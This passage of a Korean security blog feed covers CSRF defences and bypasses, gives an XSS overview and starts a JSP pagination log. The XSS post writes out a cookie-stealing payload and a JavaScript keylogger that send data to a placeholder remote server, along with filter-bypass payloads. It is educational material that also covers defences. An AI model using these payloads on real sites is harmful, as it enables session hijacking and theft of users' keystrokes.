&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
</code></pre></div></div>

<h2 id="csrf-방어하기">CSRF 방어하기</h2>

<h3 id="csrf를-referrer-로-막기">CSRF를 Referrer 로 막기</h3>

<h4 id="referrer-란">Referrer 란?</h4>
<ul>
  <li>이 요청을 어디서 한 건지 확인하는 용도이다.</li>
</ul>

<h3 id="referrer-로-막기">Referrer 로 막기</h3>
<ul>
  <li>예를들어 마이페이지에서 비밀번호 변경 요청이 와야 정상 요청이다.</li>
  <li>게시판 같은 곳에서 비밀번호 변경 요청이 오면 비정상적인 요청인 것 이다.</li>
  <li>요청을 어디서 한 것인지 확인하여 비정상적인 요청이면 막아 CSRF 공격을 예방할 수 있다.</li>
</ul>

<h3 id="csrf-토큰을-이용하여-막기">CSRF 토큰을 이용하여 막기</h3>

<h4 id="csrf-토큰-란">CSRF 토큰 란?</h4>
<ul>
  <li>CSRF 를 막기위해 만들어진 것 이다.</li>
  <li>서버에서 CSRF 토큰을 발행하여 요청이 발생하는 페이지에 몰래 넣어둔다.</li>
  <li>사용자가 요청을 보내면 토큰 값도 같이 요청의 파라미터로 보내진다.</li>
</ul>

<h4 id="csrf-토큰으로-막기">CSRF 토큰으로 막기</h4>
<ul>
  <li>사용자가 요청한 토큰 값과 서버에 저장된 토큰 값이 일치해야 정상적인 요청이라 판단한다.</li>
  <li>따라서 공격자는 서버에서 발행하는 CSRF 토큰을 알 수가 없어 CSRF 공격을 성공시킬 수 없다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"~~"</span><span class="nt">&gt;</span>
... 생략 ...
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">value=</span><span class="s">"csrf 토큰"</span><span class="nt">&gt;</span>
... 생략 ...
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<h2 id="우회-방법">우회 방법</h2>
<h3 id="referrer-check-bypass">Referrer Check Bypass</h3>
<ul>
  <li>referrer 헤더 체크 동작방식이 다음과 같으면 referrer 헤더를 없애서 검사를 우회할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>만약 referrer 헤더가 존재하면
	검사시작
없으면
	그냥 패스
</code></pre></div></div>

<ul>
  <li>다음 방법으로 referrer 헤더를 없앨 수 있다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h3 id="csrf-토큰-bypass">CSRF 토큰 Bypass</h3>
<ul>
  <li>XSS 취약점을 이용하여야 한다.</li>
  <li>먼저 토큰을 발행하는 페이지를 찾는다.</li>
  <li><code class="language-plaintext highlighter-rouge">iframe</code> 을 활용해 준다. 토큰 발행 페이지를 iframe을 통해 불러오고, iframe 에 접근하여 토큰을 파싱해 온다.</li>
  <li>토큰과 같이 요청을 서버로 보내면 공격성공이다. 서버는 CSRF 토큰을 보고 정상적인 요청이라 판단한다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"csrf 토큰을 발행하는 페이지"</span><span class="nt">&gt;</span> <span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nx">iframe</span> <span class="nx">접근하여</span> <span class="nx">csrf</span> <span class="nx">토큰을</span> <span class="nx">파싱해서</span> <span class="nx">가지고</span> <span class="nx">온다</span><span class="p">.</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h2 id="xss-와-csrf-차이점">XSS 와 CSRF 차이점</h2>

<h3 id="csrf">CSRF</h3>
<ul>
  <li>피해자가 자신도 모르게 서버로 임이의 요청을 보내게 하는 공격이다.</li>
</ul>

<h3 id="xss">XSS</h3>
<ul>
  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 란 무엇일까.]]></summary></entry><entry><title type="html">XSS 총 정리</title><link href="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="XSS 총 정리" /><published>2023-05-20T00:00:00+09:00</published><updated>2023-05-20T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="xss--cross-site-scripting--란">XSS ( Cross-Site Scripting ) 란</h2>
<ul>
  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
  <li>웹 애플리케이션에서 발생하는 취약점이다.</li>
  <li>클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다.</li>
  <li>클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다.</li>
  <li>취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다.</li>
  <li>사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.</li>
</ul>

<h2 id="클라이언트-측-코드">클라이언트 측 코드</h2>
<ul>
  <li>html</li>
  <li>javascript</li>
  <li>css</li>
</ul>

<h2 id="poc-코드">POC 코드</h2>
<ul>
  <li>웹 애플리케이션 XSS 취약점을 이용한 공격이 가능함을 확인할 수 있다.</li>
</ul>

<h3 id="자주-이용하는-poc-코드">자주 이용하는 POC 코드</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">alert(1)</code></li>
  <li><code class="language-plaintext highlighter-rouge">console.log(1)</code></li>
</ul>

<h2 id="공격-피해">공격 피해</h2>

<h3 id="사용자-쿠키-탈취">사용자 쿠키 탈취</h3>
<ul>
  <li>document.cookie 를 활용하여 사용자 쿠키 값을 훔친다.</li>
  <li>사용자 브라우저의 쿠키에 저장된 합법적인 <strong>Session ID 값</strong>이나 <strong>액세스 토큰 값</strong>을 훔쳐 원격지 서버로 전송한다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackURL</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">'var hackUrl = "원격지 서버?value=";new Image().src = hackURL + document.cookie;'</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h3 id="사용자-개인정보-탈취">사용자 개인정보 탈취</h3>
<ul>
  <li>Key Logger 방식으로 사용자 입력을 탈취한다.</li>
  <li>XSS Keylog 가 삽입된 페이지에 사용자가 접근하면 Keyboard Event 를 통해 입력 값을 후킹한다.</li>
  <li>후킹한 값을 원격지 서버로 전송한다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> 
	<span class="kd">get</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">?</span><span class="nx">event</span><span class="p">:</span><span class="nx">e</span><span class="p">;</span>
	<span class="nx">key</span> <span class="o">=</span> <span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">?</span><span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">:</span><span class="kd">get</span><span class="p">.</span><span class="nx">charCode</span><span class="p">;</span> 
	<span class="nx">key</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span> 
	<span class="nx">keys</span><span class="o">+=</span><span class="nx">key</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="nb">window</span><span class="p">.</span><span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
	<span class="nf">if</span><span class="p">(</span><span class="nx">keys</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span> 
		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackUrl</span> <span class="o">+</span> <span class="nx">keys</span><span class="p">;</span>
		<span class="nx">keys</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span> 
	<span class="p">}</span> 
<span class="p">},</span> <span class="mi">200</span><span class="p">);</span>
</code></pre></div></div>

<h3 id="악성코드-다운로드">악성코드 다운로드</h3>
<ul>
  <li>사용자가 악성 스크립트가 있는 URL을 클릭하도록 유도하여 악성 프로그램 다운로드 받는 사이트로 리타이렉한다.</li>
  <li>사용자가 악성 프로그램을 다운로드 하도록 유도한다.</li>
</ul>

<h3 id="피싱-사이트-강제-이동">피싱 사이트 강제 이동</h3>
<ul>
  <li>가짜 사이트로 위장하여 사용자의 로그인 정보를 탈취한다.</li>
  <li>실제 사이트와 유사한 웹 페이지를 통해 사용자의 개인정보를 훔쳐올 수 있다.</li>
</ul>

<h2 id="공격-유형">공격 유형</h2>

<h3 id="stored--또는-persistent--xss">Stored ( 또는 Persistent ) XSS</h3>
<ul>
  <li>공격자가 악성 스크립트를 취약한 웹 서버에 저장하는 공격이다.</li>
  <li>광역적으로 공격이 가능하다. 하지만 흔적이 웹 서버에 남는다.</li>
  <li>지속적으로 피해를 입히는 공격이다.</li>
  <li>공격자가 악성 스크립트를 웹 서버 페이지에 저장하고 해당 페이지가 사용자에게 노출시켜 악성 스크립트가 사용자 브라우저에서 자동으로 실행되게 된다.</li>
</ul>

<h4 id="취약점-유형">취약점 유형</h4>
<ul>
  <li>댓글</li>
  <li>게시판</li>
  <li>이메일</li>
  <li>블로그 글</li>
  <li>채팅방의 유저 이름</li>
</ul>

<h4 id="공격-과정">공격 과정</h4>
<ol>
  <li>공격자가 Stored XSS 취약점을 가지는 웹 페이지( 게시판 )를 찾는다.</li>
  <li>공격자가 게시판에 사용자의 민감한 정보( 쿠키 )를 탈취하기 위한 악성 스크립트 코드를 포함한  글을 작성하고 저장한다.</li>
  <li>공격자가 작성한 글에 사용자가 들어가면 민감한 정보(쿠키)를 공격자에게 전송한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOy3qOyVve2VnCDsm7kg7Y6Y7J207KeAIOywvuq4sFxu6rO16rKp7J6QIC0-PiDqs7XqsqnsnpAgOiDqsozsi5zquIAg7J6R7ISxXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg7KCA7J6lXG7sgqzsmqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg66qp66GdIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOuqqeuhnSDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog6rO16rKp7J6QIOqyjOyLnOq4gCDtgbTrpq1cbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="reflected-xss">Reflected XSS</h3>
<ul>
  <li>Get 방식을 통해 공격이 이루어 진다.</li>
  <li>사용자 입력을 그대로 페이지에 보여주는 곳에서 발생한다.</li>
  <li>공격자는 URL에 악성 스크립트를 심고, 만들어진 URL을 사용자에게 전달한다. 이러면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
  <li>SSR ( Server Side Rendering ). 서버에서 페이지를 완성하여 사용자에게 보내주는 페이지에서 발생하는 취약점이다.</li>
</ul>

<h4 id="취약점-유형-1">취약점 유형</h4>
<ul>
  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
  <li>사용자 입력이 웹 페이지 코드에 그대로 들어가는 사이트.</li>
</ul>

<h4 id="과정">과정</h4>
<ol>
  <li>공격자가 Reflected XSS 취약점이 있는 페이지를 찾는다.</li>
  <li>공격자는 XSS 취약점 페이지의 URL의 파라미터에 악성 스크립트 코드를 사입하여 공격 URL을 만든다.</li>
  <li>공격자가 만든 URL을 사용자에게 건내주어 클릭하도록 유도한다.</li>
  <li>사용자가 링크를 클릭하여 페이지 들어 가면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IFJlZmxlY3RlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLBcbuqzteqyqeyekCAtPj4g6rO16rKp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuOulvCDri7TsnYAgVVJMIOunjOuTrFxu6rO16rKp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkwg66eB7YGs66W8IO2BtOumre2VmOuPhOuhnSDsnKDrj4RcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog7JmE7ISx65CcIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumvSDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="dom-based-xss">DOM Based XSS</h3>
<ul>
  <li>서버 측에서 탐지하기가 어렵다.</li>
  <li>최초에 HTML 문서를 서버로 부터 받으면, 그 이후에는 서버로 요청을 보내지 않고 악성스크립트를 심을 수 있다.</li>
  <li>서버에 요청은 없지만,  URL 주소 해시에 심은 악성 스크립트가 실행된다.</li>
  <li>CSR(Client Side Rendering) 클라이언트 사이드에서 페이지를 그려준다. 즉 클라이언트 브라우저의 javascript 에서 get 요청 값을 가져와 페이지를 완성시킨다.</li>
</ul>

<h4 id="취약점-유형-2">취약점 유형</h4>
<ul>
  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
</ul>

<h4 id="과정-1">과정</h4>
<ol>
  <li>공격자는 DOM Based XSS 취약점이 있는 페이지를 찾는다.</li>
  <li>공격자는 XSS 취약점이 있는 페이지 URL의 파라미터에 악성 스크립트를 넣어준다.</li>
  <li>공격자는 완성한 URL을 사용자에게 보내어 클릭하도록 유도한다.</li>
  <li>사용자가 URL 링크를 클릭하여 페이지에 들어가면 사용자 브라우저에서 악성 스크립트가 동작한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h2 id="xss-bypass--우회방법-">XSS Bypass ( 우회방법 )</h2>
<ul>
  <li>서버에서 Black List 기반의 XSS 필터링을 적용 되었을 때의 우회방법이다.</li>
</ul>

<h3 id="client-side-검증-우회">Client Side 검증 우회</h3>
<ul>
  <li>Burp Suite (프록시 툴)을 이용하여 다시 원래대로 만들어 준다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>client side에서 치환된다.
&lt;script&gt; =&gt; &amp;lt;script&amp;gt;

프록시 툴로 다시 원래대로 만든다.
&amp;lt;script&amp;gt; =&gt; &lt;script&gt;
</code></pre></div></div>

<h3 id="script-load">Script Load</h3>
<ul>
  <li>XSS 공격할 때 글자 수가 제한되어 있다면 유용하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="http://악성스크립트"&gt;&lt;/script&gt;
</code></pre></div></div>

<h3 id="대소문자-혼용하기">대소문자 혼용하기</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;ScRiPt&gt;
</code></pre></div></div>

<h3 id="필터링-되는-문자">필터링 되는 문자</h3>
<ul>
  <li>만약 서버에서 script 라는 문자를 빈칸으로 바꾼다면 다음과 같이 우회하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;scrscriptipt&gt;
</code></pre></div></div>

<h3 id="eventhandler">EventHandler</h3>
<ul>
  <li>많은 태그와 이벤트 헨들러로 우회를 시도할 수 있다.</li>
  <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" title="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src=x onerror="alert(1)"&gt;
- onactivate
- onload

&lt;svg&gt;
&lt;audio src="" onplay="" autoplay&gt;
</code></pre></div></div>

<h2 id="대응-방안">대응 방안</h2>
<h3 id="html-entity">HTML Entity</h3>
<ul>
  <li>HTML 특수 문자들을 HTML Entity 로 모두 치환하면 된다.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>문자</th>
      <th>인코딩 된 문자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;amp;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;lt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x27;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;quot;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">(</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#40;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">)</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#41;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x2F;</code></td>
    </tr>
  </tbody>
</table>

<h3 id="문제점">문제점</h3>
<ul>
  <li>하지만 HTML Editor 게시판에서는 전부 치환을 못한다.</li>
  <li>잘 사용하지 않는 게시판이면 해당 게시판을 안쓰는 것이 좋다.</li>
  <li>잘 사용되는 게시판이라면 <strong>White List 기반 필터링</strong> 과 <strong>Black List 기반 필터링</strong>을 같이 적용해야한다.
    <blockquote>
      <p>step 1. 모든 HTML 특수 문자들을 HTML Entity 로 치환한다.<br /><br />
step 2. <strong>White List</strong> 기반 필터링으로 살려줄 (허용해줄) 태그를 살려 준다.<br />ex) img, p, a, …<br /><br />
step 3. <strong>Black List</strong> 기반으로 Event Handler를 필터링 하기.<br />ex) onerror, onload 막기</p>
    </blockquote>
  </li>
</ul>

<h2 id="참고">참고</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> 태그 안에서는 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 태그가 안 먹힌다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://junhyunny.github.io/information/security/dom-based-cross-site-scripting/">DOM 기반 XSS(DOM based Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><category term="javascript" /><category term="html" /><summary type="html"><![CDATA[XSS ( Cross-Site Scripting ) 란 클라이언트 측 스크립트를 삽입하는 공격이다. 웹 애플리케이션에서 발생하는 취약점이다. 클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다. 클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다. 취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다. 사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.]]></summary></entry><entry><title type="html">웹 서버 개발 12 페이징 번호</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/" rel="alternate" type="text/html" title="웹 서버 개발 12 페이징 번호" /><published>2023-05-16T00:00:00+09:00</published><updated>2023-05-16T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/"><![CDATA[<h2 id="게시글-페이징-번호">게시글 페이징 번호</h2>
<ul>
  <li><a href="https://stackoverflow.com/search?page=29&amp;tab=Relevance&amp;pagesize=15&amp;q=jsp&amp;searchOn=3&amp;s=48d80aca-ac2a-486e-8868-d30aed82bf58">stackoverflow</a>의 페이징 스타일을 참고하였다.</li>
  <li>현재 페이지에 5개의 게시글을 보여준다.</li>
  <li>나중에 사용자가 한 페이지에 볼 수 있는 게시글 수를 정할수 있게 할 것이다.</li>
  <li>완성된 페이징 페이지.<br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ff3b6285-554c-4496-a7bf-2e21de43a8e9" alt="Pasted image 20230515223925" /></li>
</ul>

<h3 id="jsp">JSP</h3>
<ul>
  <li>게시글의 베이스가 되는 jsp 파일을 수정하였다.</li>
</ul>

<h4 id="notice_boardjsp">notice_board.jsp</h4>
<ul>
  <li>servlet 으로 부터 현재 페이지와 마지막 페이지 정보를 받아온다.</li>
  <li>페이징 번호 리스트 정보를 받아온다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a2b399311e658a135115829604a4721f.js"></script>

<p><br /></p>
<ul>
  <li>페이징 번호 리스트 정보를 이용하여 페이징 부분을 그려준다.</li>
  <li>리스트에 들어있는 0은 생략을 의미한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/3837b0845cb1383d7183418bfe310d75.js"></script>

<p><br /></p>

<ul>
  <li>총 게시글 수 보여주기.</li>
  <li>servlet 으로 부터 받은 총 게시글 수를 보여준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/0d2bee07d5992c7a8f9d636392476f66.js"></script>

<p><br /></p>
<ul>
  <li>페이징 번호 스타일.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/c0c2034a0350abe4dba5f3b38e5d2b84.js"></script>

<p><br /></p>

<ul>
  <li>참고</li>
  <li>form 에서 input이 여러개면 엔터를 눌러도 submit 이 안된다.</li>
  <li>이럴 때는 type이 submit 인 input을 만들어 줘야한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/4733be6980bb83915c196cc75387d2bb.js"></script>

<p><br /></p>

<h3 id="servlet">Servlet</h3>

<h4 id="mainpagejava">MainPage.java</h4>

<ul>
  <li>uriSearch 함수의 게시판 부분이다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/90ed9ab083b6c47dac20bc5ac85a419d.js"></script>

<p><br /></p>
<ul>
  <li>현재 페이지 정보를 get의 파라미터로 받아온다.</li>
  <li>즉 <code class="language-plaintext highlighter-rouge">url?page=2&amp;q=검색</code> 형태이다.</li>
  <li>페이지 정보를 못 받아오거나 음수면 페이지를 1로 초기화를 진행한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/33f35d284dbcef6939581c769bc071dc.js"></script>

<p><br /></p>
<ul>
  <li>검색 결과에 해당하는 총 게시글의 수 구하기.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/319742435a0083c49288524bac837b50.js"></script>

<p><br /></p>
<ul>
  <li>한 페이지 보여줄 게시글의 수를 정한다.</li>
  <li>마지막 페이지를 구해준다.</li>
  <li>사용자로 부터 받은 페이지 수가 마지막 페이지 보다 크다면 마지막 페이지로 리다이렉트 한다.</li>
  <li>sql문으로 검색을 하기위해서 실제 데이터의 시작 위치를 계산하여 준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/183a2b08e5bbe4c24e503059f1b57340.js"></script>

<p><br /></p>

<ul>
  <li>검색 데이터 가져오기.</li>
  <li>여기서는 5개의 게시글을 가져온다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/60563c690675f704572ed2b2fb53e86b.js"></script>

<p><br /></p>

<ul>
  <li>페이징 번호를 저장하기 위한 리스트를 만들어준다.</li>
  <li>한번에 몇개의 페이징번호를 보여줄지 정해준다.</li>
  <li>해당 리스트에 0은 생략을 의미한다.</li>
  <li>예를들어 현재 페이지가 <code class="language-plaintext highlighter-rouge">6</code>이고 마지막 페이지가 <code class="language-plaintext highlighter-rouge">10</code> 이면 페이징 형태가 다음과 같다.  <br /><code class="language-plaintext highlighter-rouge">1 ... 4 5 6 7 8 ... 10</code></li>
</ul>

<script src="https://gist.github.com/MinGyu2/55e88f3c9e0541a01bf2e5f7e3fe016b.js"></script>

<p><br /></p>

<ul>
  <li>페이지를 그리기위하여 <code class="language-plaintext highlighter-rouge">mainpage jsp</code>로 지금까지 만들었던 정보를 넘겨준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/ff414408dd9e1e1f57987724682add56.js"></script>

<p><br /></p>

<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>

<ul>
  <li>검색목록을 가져오는 getNoticeList 함수를 수정하였다.</li>
  <li>모든 목록을 가져오는 것이아닌 정해준 갯수의 게시물 목록만 가지고 온다.</li>
  <li>게시글의 시작위치와 가져올 갯수를 함수의 인자로 준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/64410a9c64396ddadf7daae2e395c527.js"></script>

<p><br /></p>
<ul>
  <li>sql 쿼리문에 특정 갯수만 출력을 하기위한 구문을 추가한다.</li>
  <li><code class="language-plaintext highlighter-rouge">prepared statment</code>를 이용하였다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/4becbc45b945e4751efaed31724bcf75.js"></script>

<p><br /></p>

<ul>
  <li>검색된 게시판 목록 총 개수 구하기.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a81e9332c5ece965cee636428604b360.js"></script>

<h3 id="전체코드">전체코드</h3>

<h4 id="mainpagejava-1">MainPage.java</h4>
<script src="https://gist.github.com/MinGyu2/95dee19807c4b09f512b2584b0f3e224.js"></script>

<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
<script src="https://gist.github.com/MinGyu2/a0071a20f1b991dadccc9e8c307a1ab4.js"></script>

<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>

<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>

<h3 id="웹-프로젝트">웹 프로젝트</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
